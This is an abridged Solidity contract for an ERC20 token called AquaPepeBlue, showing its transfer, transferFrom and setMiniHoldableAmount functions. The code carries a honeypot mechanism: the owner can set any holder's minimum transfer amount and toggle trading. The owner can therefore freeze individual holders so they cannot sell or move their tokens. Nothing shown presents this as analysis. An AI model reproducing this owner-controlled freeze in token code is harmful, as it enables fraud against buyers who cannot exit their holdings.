...
contract AquaPepeBlue is Context, Ownable, IERC20 {
    ...
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        require(_tradingEnabled, "AQUAPE: Trading is currently disabled");
        require(amount >= _miniHoldableAmounts[_msgSender()], "AQUAPE: Transfer amount is less than the minimum allowed");
        require(_balances[_msgSender()] >= amount, "AQUAPE: transfer amount exceeds balance");
    ...
    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        require(_tradingEnabled, "AQUAPE: Trading is currently disabled");
        require(amount >= _miniHoldableAmounts[sender], "AQUAPE: Hold lesser than minimum amount");
        require(_balances[sender] >= amount, "AQUAPE: transfer amount exceeds balance");
        require(_allowances[sender][_msgSender()] >= amount, "AQUAPE: transfer amount exceeds allowance");
    ...
    function setMiniHoldableAmount(address account, uint256 newAmount) public onlyOwner {
        require(account != address(0), "AQUAPE: address zero is not a valid account");
        _miniHoldableAmounts[account] = newAmount;
